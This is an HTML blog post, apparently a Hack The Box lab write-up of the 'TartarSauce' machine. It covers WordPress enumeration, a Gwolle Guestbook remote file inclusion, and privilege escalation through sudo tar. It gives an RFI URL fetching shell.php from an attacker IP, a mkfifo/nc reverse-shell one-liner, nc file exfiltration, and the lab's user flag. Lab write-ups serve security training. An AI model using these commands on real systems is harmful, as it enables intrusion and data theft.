<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="TartarSauceTarget 2 flags">
<meta property="og:type" content="article">
<meta property="og:title" content="HTB-TartarSauce">
<meta property="og:url" content="http://kelpie.top/post/Virtual%20Attack%20[12].html">
<meta property="og:site_name" content="Kelpie Blog">
<meta property="og:description" content="TartarSauceTarget 2 flags">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv06mr9mOSHCqNT4EZzzrUl6m6gl.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiKJvcs5bS5r1w-28ufIfSlpQG9t.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhgBdradMrMTs7jNuaVSvc_R0cMp.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnbNsNJQ-Ghq5ALxNtyLW8avkyRg.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjGgN6Kt-wYEyjyxBVab-fs923ZI.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvqnkoqVRjt_nT2ycz32Ebl9YB4Q.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoaNGEsy5MfLyM4F1RsS70XQ1-3O.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fnd622UqUjBZGvWbu6zWUvZPhjPx.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FigBGBRNM7KYYJM004XGCElbYci-.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fnwk2wgx2Gp4LYzxXrTK8F0I1Wvo.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fo68aMPxYaeFUgM_X7LnplZrUXe_.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Ft3mn41m9Kvhqve9ngB_XJGvxmKg.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhIP7qSQLgbUZ9XDyUgfv_EWOnqd.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn6OwULZzSR_C1inNSHOMHtoPcyj.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fqib4Cm8cSemJZLLSX_Qd7eun79r.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrnZpgO-hNp2NbD8TH5KInzALYvs.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqiLvLlb8fasX5rkoSs6qwB30aKd.png">
<meta property="og:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FkVq2D3G4aoTUBw4zi7FIHXj611d.png">
<meta property="article:published_time" content="2022-02-11T14:18:00.000Z">
<meta property="article:modified_time" content="2024-04-10T09:43:13.314Z">
<meta property="article:author" content="l3vi4th4n">
<meta property="article:tag" content="Hack the Box">
<meta property="article:tag" content="Penetration Test">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv06mr9mOSHCqNT4EZzzrUl6m6gl.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>HTB-TartarSauce</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/k3lpi3b4nsh33">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/post/Virtual%20Attack%20%5B13%5D.html"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/post/Virtual%20Attack%20%5B11%5D.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://kelpie.top/post/Virtual%20Attack%20[12].html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&text=HTB-TartarSauce"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&title=HTB-TartarSauce"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&is_video=false&description=HTB-TartarSauce"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=HTB-TartarSauce&body=Check out this article: http://kelpie.top/post/Virtual%20Attack%20[12].html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&title=HTB-TartarSauce"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&title=HTB-TartarSauce"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&title=HTB-TartarSauce"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&title=HTB-TartarSauce"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://kelpie.top/post/Virtual%20Attack%20[12].html&name=HTB-TartarSauce&description=&lt;h1 id=&#34;TartarSauce&#34;&gt;&lt;a href=&#34;#TartarSauce&#34; class=&#34;headerlink&#34; title=&#34;TartarSauce&#34;&gt;&lt;/a&gt;TartarSauce&lt;/h1&gt;&lt;h2 id=&#34;Target&#34;&gt;&lt;a href=&#34;#Target&#34; class=&#34;headerlink&#34; title=&#34;Target&#34;&gt;&lt;/a&gt;Target&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;2 flags&lt;/li&gt;
&lt;/ol&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://kelpie.top/post/Virtual%20Attack%20[12].html&t=HTB-TartarSauce"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TartarSauce"><span class="toc-number">1.</span> <span class="toc-text">TartarSauce</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Target"><span class="toc-number">1.1.</span> <span class="toc-text">Target</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Process"><span class="toc-number">2.</span> <span class="toc-text">Process</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Port-Scan"><span class="toc-number">2.1.</span> <span class="toc-text">Port Scan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Info-collection"><span class="toc-number">2.2.</span> <span class="toc-text">Info collection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wordpress-Site"><span class="toc-number">2.3.</span> <span class="toc-text">Wordpress Site</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Wpscan"><span class="toc-number">2.4.</span> <span class="toc-text">Wpscan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-www-date"><span class="toc-number">2.5.</span> <span class="toc-text">Shell as www-date</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shell-as-onuma"><span class="toc-number">2.6.</span> <span class="toc-text">Shell as onuma</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-the-user-flag"><span class="toc-number">2.6.1.</span> <span class="toc-text">Get the user flag</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privesc-onuma-%E2%86%92-root"><span class="toc-number">2.7.</span> <span class="toc-text">Privesc onuma → root</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Indentify-the-cron-with-pspy32"><span class="toc-number">2.7.1.</span> <span class="toc-text">Indentify the cron with pspy32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Understanding-backuper-script"><span class="toc-number">2.7.2.</span> <span class="toc-text">Understanding backuper script</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploiting-backuperer"><span class="toc-number">2.7.3.</span> <span class="toc-text">Exploiting backuperer</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Get-the-root-flag"><span class="toc-number">2.7.3.1.</span> <span class="toc-text">Get the root flag</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Get-the-root-shell"><span class="toc-number">2.7.3.2.</span> <span class="toc-text">Get the root shell</span></a></li></ol></li></ol></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        HTB-TartarSauce
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">l3vi4th4n</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-02-11T14:18:00.000Z" class="dt-published" itemprop="datePublished">2022-02-11</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Penetration-Test/">Penetration Test</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Hack-the-Box/" rel="tag">Hack the Box</a>, <a class="p-category" href="/tags/Penetration-Test/" rel="tag">Penetration Test</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="TartarSauce"><a href="#TartarSauce" class="headerlink" title="TartarSauce"></a>TartarSauce</h1><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ol>
<li>2 flags</li>
</ol>
<span id="more"></span>

<h1 id="Process"><a href="#Process" class="headerlink" title="Process"></a>Process</h1><h2 id="Port-Scan"><a href="#Port-Scan" class="headerlink" title="Port Scan"></a>Port Scan</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> nmap <span class="token parameter variable">-sS</span> -p- --min-rate<span class="token operator">=</span><span class="token number">10000</span> <span class="token number">10.10</span>.10.88<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fv06mr9mOSHCqNT4EZzzrUl6m6gl.png"></p>
<h2 id="Info-collection"><a href="#Info-collection" class="headerlink" title="Info collection"></a>Info collection</h2><p>Access the website<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FiKJvcs5bS5r1w-28ufIfSlpQG9t.png"><br>Go back to the enumeration, dirsearch provides another path &#x2F;webservices</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/index.html <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span>
/robots.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span>
/webservices <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Trying to access the &#x2F;webservices url just return a 403 forbidden. But another round of dirsearch gives a &#x2F;wp path</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
/wp <span class="token punctuation">(</span>Status: <span class="token number">301</span><span class="token punctuation">)</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<h2 id="Wordpress-Site"><a href="#Wordpress-Site" class="headerlink" title="Wordpress Site"></a>Wordpress Site</h2><p>The website is broken.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhgBdradMrMTs7jNuaVSvc_R0cMp.png"><br>After inspecting the web elements, we have to modify the &#x2F;etc&#x2F;hosts file to add the dns address to it<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FnbNsNJQ-Ghq5ALxNtyLW8avkyRg.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FjGgN6Kt-wYEyjyxBVab-fs923ZI.png"><br>We can access the site normally, next step is to find the vulnerbilities in this Wordpress site<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FvqnkoqVRjt_nT2ycz32Ebl9YB4Q.png"></p>
<h2 id="Wpscan"><a href="#Wpscan" class="headerlink" title="Wpscan"></a>Wpscan</h2><p>wpscan is a good tool to enumerate WordPress sites. I’ll use –enumerate p,t,au –plugins-detection mixedoption to enumerate plugins, themes, and users. The output is quite long, but snipped to show that it identifies three plugins:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan  <span class="token parameter variable">--url</span> http://10.10.10.88/webservices/wp <span class="token parameter variable">--enumerate</span> t,u,ap  --plugins-detection mixed <span class="token parameter variable">-t</span> <span class="token number">500</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FoaNGEsy5MfLyM4F1RsS70XQ1-3O.png"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>+<span class="token punctuation">]</span> We found <span class="token number">3</span> plugins:
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Name: akismet - v4.0.3
 <span class="token operator">|</span>  Last updated: <span class="token number">2018</span>-05-26T17:14:00.000Z
 <span class="token operator">|</span>  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/
 <span class="token operator">|</span>  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/akismet/readme.txt
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> The version is out of date, the latest version is <span class="token number">4.0</span>.6
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Name: brute-force-login-protection - v1.5.3
 <span class="token operator">|</span>  Latest version: <span class="token number">1.5</span>.3 <span class="token punctuation">(</span>up to <span class="token function">date</span><span class="token punctuation">)</span>
 <span class="token operator">|</span>  Last updated: <span class="token number">2017</span>-06-29T10:39:00.000Z
 <span class="token operator">|</span>  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/
 <span class="token operator">|</span>  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/brute-force-login-protection/readme.txt
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Name: gwolle-gb - v2.3.10
 <span class="token operator">|</span>  Last updated: <span class="token number">2018</span>-05-12T10:06:00.000Z
 <span class="token operator">|</span>  Location: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/
 <span class="token operator">|</span>  Readme: http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/readme.txt
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> The version is out of date, the latest version is <span class="token number">2.5</span>.2
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Enumerating installed themes <span class="token punctuation">(</span>only ones marked as popular<span class="token punctuation">)</span> <span class="token punctuation">..</span>.
<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Shell-as-www-date"><a href="#Shell-as-www-date" class="headerlink" title="Shell as www-date"></a>Shell as www-date</h2><p>There’s a** RFI vulnerability in Gwolle Guestbook v 1.5.3**. In this case, visiting <a target="_blank" rel="noopener" href="http://10.10.10.88/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ip/path">http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://ip/path</a> will include that file<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fnd622UqUjBZGvWbu6zWUvZPhjPx.png"><br>We can let the victim machine to access local web-server to make the reverse-shell<br>Open the local http server and nc listener and access the website again.<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FigBGBRNM7KYYJM004XGCElbYci-.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fnwk2wgx2Gp4LYzxXrTK8F0I1Wvo.png"><br><a target="_blank" rel="noopener" href="http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.11/shell.php">http://tartarsauce.htb/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.11/shell.php</a></p>
<h2 id="Shell-as-onuma"><a href="#Shell-as-onuma" class="headerlink" title="Shell as onuma"></a>Shell as onuma</h2><p>We get the initial shell as www-data, but we gotta to upgrade the machine priviledge, we can put the command sudo -l<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fo68aMPxYaeFUgM_X7LnplZrUXe_.png"><br>As www-data, we can’t get into the lone user directory:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@TartarSauce:/home$ <span class="token function">ls</span>
onuma
www-data@TartarSauce:/home$ <span class="token builtin class-name">cd</span> onuma/
bash: cd: onuma/: Permission denied<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>Notice that user www-data can run sudo with no password for &#x2F;bin&#x2F;tar:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">www-data@TartarSauce:/dev/shm$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> www-data on TartarSauce:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin<span class="token punctuation">\</span>:/snap/bin
User www-data may run the following commands on TartarSauce:
    <span class="token punctuation">(</span>onuma<span class="token punctuation">)</span> NOPASSWD: /bin/tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Gtfobins<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Ft3mn41m9Kvhqve9ngB_XJGvxmKg.png"></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-u</span> onuma <span class="token function">tar</span> <span class="token parameter variable">-cf</span> /dev/null /dev/null <span class="token parameter variable">--checkpoint</span><span class="token operator">=</span><span class="token number">1</span> --checkpoint-action<span class="token operator">=</span>exec<span class="token operator">=</span>/bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FhIP7qSQLgbUZ9XDyUgfv_EWOnqd.png"></p>
<h3 id="Get-the-user-flag"><a href="#Get-the-user-flag" class="headerlink" title="Get the user flag"></a>Get the user flag</h3><p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fn6OwULZzSR_C1inNSHOMHtoPcyj.png"><br>User flag:** b2d6ec45472467c836f253bd170182c7**</p>
<h2 id="Privesc-onuma-→-root"><a href="#Privesc-onuma-→-root" class="headerlink" title="Privesc onuma → root"></a>Privesc onuma → root</h2><p>We can have to copy the shell for us to improve our fault tolerance in case we disconnect the shell</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">rm</span> /tmp/f<span class="token punctuation">;</span><span class="token function">mkfifo</span> /tmp/f<span class="token punctuation">;</span><span class="token function">cat</span> /tmp/f<span class="token operator">|</span><span class="token function">sh</span> <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span><span class="token function">nc</span> <span class="token number">10.10</span>.14.11 <span class="token number">4446</span> <span class="token operator">></span>/tmp/f <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/Fqib4Cm8cSemJZLLSX_Qd7eun79r.png"><br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FrnZpgO-hNp2NbD8TH5KInzALYvs.png"><br>Now we get 2 interactive shells</p>
<h3 id="Indentify-the-cron-with-pspy32"><a href="#Indentify-the-cron-with-pspy32" class="headerlink" title="Indentify the cron with pspy32"></a>Indentify the cron with pspy32</h3><p>pspy is the process detection, we can find<br><img src="https://l3vi4th4n.oss-cn-hangzhou.aliyuncs.com/blog-images/FqiLvLlb8fasX5rkoSs6qwB30aKd.png"><br>grab the backuperer to the local machine to analyze the file</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">Local machine<span class="token operator">:</span>
nc <span class="token operator">-</span>lp <span class="token number">6000</span> <span class="token operator">></span> backuper
Victim machine
nc <span class="token operator">&lt;</span>ip<span class="token operator">></span> <span class="token number">6000</span> <span class="token operator">&lt;</span> <span class="token operator">/</span>usr<span class="token operator">/</span>sbin<span class="token operator">/</span>backuperer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="Understanding-backuper-script"><a href="#Understanding-backuper-script" class="headerlink" title="Understanding backuper script"></a>Understanding backuper script</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">#<span class="token operator">!</span><span class="token operator">/</span>bin<span class="token operator">/</span>bash
#<span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token directive keyword">backuperer</span> <span class="token expression">ver <span class="token number">1.0</span><span class="token number">.2</span> <span class="token operator">-</span> by ȜӎŗgͷͼȜ</span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">ONUMA Dev <span class="token keyword">auto</span> backup program</span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">This tool will keep our webapp backed up in <span class="token keyword">case</span> another skiddie defaces us again<span class="token punctuation">.</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span> <span class="token expression">We will be able to quickly restore from a backup in seconds <span class="token punctuation">;</span>P</span></span>
